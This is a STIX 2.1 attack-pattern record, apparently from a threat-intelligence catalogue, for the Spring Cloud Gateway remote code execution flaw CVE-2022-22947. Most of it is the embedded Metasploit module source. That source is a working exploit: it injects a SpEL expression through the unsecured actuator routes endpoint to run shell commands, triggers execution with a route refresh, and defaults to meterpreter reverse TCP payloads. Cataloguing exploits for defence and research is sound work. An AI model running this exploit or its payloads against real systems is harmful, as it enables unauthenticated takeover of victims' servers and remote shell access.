{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--37db511a-2a59-41bc-b437-87095ed30572",
    "created": "2024-08-14T17:02:56.895198Z",
    "modified": "2024-08-14T17:02:56.895202Z",
    "name": "Spring Cloud Gateway Remote Code Execution",
    "description": " This module exploits an unauthenticated remote code execution vulnerability in Spring Cloud Gateway versions = 3.1.0 and 3.0.0 to 3.0.6. The vulnerability can be exploited when the Gateway Actuator endpoint is enabled, exposed and unsecured. An unauthenticated attacker can use SpEL expressions to execute code and take control of the victim machine.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/spring_cloud_gateway_rce.rb",
            "external_id": "spring_cloud_gateway_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-22947"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/crowsec-edtech/CVE-2022-22947"
        },
        {
            "source_name": "reference",
            "url": "https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/"
        },
        {
            "source_name": "reference",
            "url": "https://tanzu.vmware.com/security/cve-2022-22947"
        },
        {
            "source_name": "reference",
            "url": "https://spring.io/blog/2022/03/01/spring-cloud-gateway-cve-reports-published"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Spring Cloud Gateway Remote Code Execution',\n        'Description' => %q{\n          This module exploits an unauthenticated remote code execution vulnerability in Spring Cloud Gateway\n          versions = 3.1.0 and 3.0.0 to 3.0.6. The vulnerability can be exploited when the Gateway Actuator\n          endpoint is enabled, exposed and unsecured. An unauthenticated attacker can use SpEL\n          expressions to execute code and take control of the victim machine.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Ayan Saha'\n        ],\n        'References' => [\n          ['CVE', '2022-22947' ],\n          ['URL', 'https://github.com/crowsec-edtech/CVE-2022-22947'],\n          ['URL', 'https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/'],\n          ['URL', 'https://tanzu.vmware.com/security/cve-2022-22947'],\n          ['URL', 'https://spring.io/blog/2022/03/01/spring-cloud-gateway-cve-reports-published']\n        ],\n        'Platform' => 'linux',\n        'Arch' => [ARCH_X64, ARCH_CMD],\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/python/meterpreter/reverse_tcp',\n                'RPORT' => 9000\n              }\n            }\n          ],\n          [\n            'Linux (Dropper)',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X64],\n              'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' },\n              'Type' => :linux_dropper\n            }\n          ],\n        ],\n        'DisclosureDate' => '2022-01-26',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ]\n        }\n      )\n    )\n  end\n\n  def run_command(cmd)\n    route_name = Rex::Text.rand_text_alpha(8).downcase\n    uri = \"/actuator/gateway/routes/#{route_name}\"\n    value = '#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/sh\",\"-c\", \"' + cmd + '\"}).getInputStream()))}'\n\n    data = {\n      'id' => route_name,\n      'filters' => [\n        {\n          'name' => 'AddResponseHeader',\n          'args' =>\n            {\n              'name' => 'Result',\n              'value' => value\n            }\n        }\n      ],\n      'uri' => \"http://#{Rex::Text.rand_text_alphanumeric(6..15)}.com\"\n    }\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(uri),\n      'ctype' => 'application/json',\n      'data' => JSON.generate(data)\n    })\n\n    if res && res.code == 201 && res.message == 'Created'\n      return route_name\n    else\n      return nil\n    end\n  end\n\n  ## Takes in the command and creates a new route with it on the server\n  def execute_command(cmd, _opts = {})\n    route_name = run_command(cmd)\n    if route_name\n      refresh\n      cleanup_route(route_name)\n    else\n      return false\n    end\n    return true\n  end\n\n  ## Cleaning up the routes created\n  def cleanup_route(route_name)\n    uri = \"/actuator/gateway/routes/#{route_name}\"\n    res = send_request_cgi({\n      'method' => 'DELETE',\n      'uri' => normalize_uri(uri)\n    })\n\n    if res && res.code == 200\n      print_good('Route deleted')\n      return true\n    else\n      print_error(\"Couldn't delete route. Might require manual cleanup.\")\n      return false\n    end\n  end\n\n  def check\n    print_status('Checking if server is vulnerable')\n    res = execute_command('whoami')\n\n    if res\n      return Exploit::CheckCode::Vulnerable\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  ## Refresh the gateway to trigger the routes with commands created\n  def refresh\n    print_status('Triggering code execution using routes')\n    uri = '/actuator/gateway/refresh'\n\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(uri)\n    })\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2022-01-26",
    "x_mitre_platforms": [
        "linux'"
    ]
}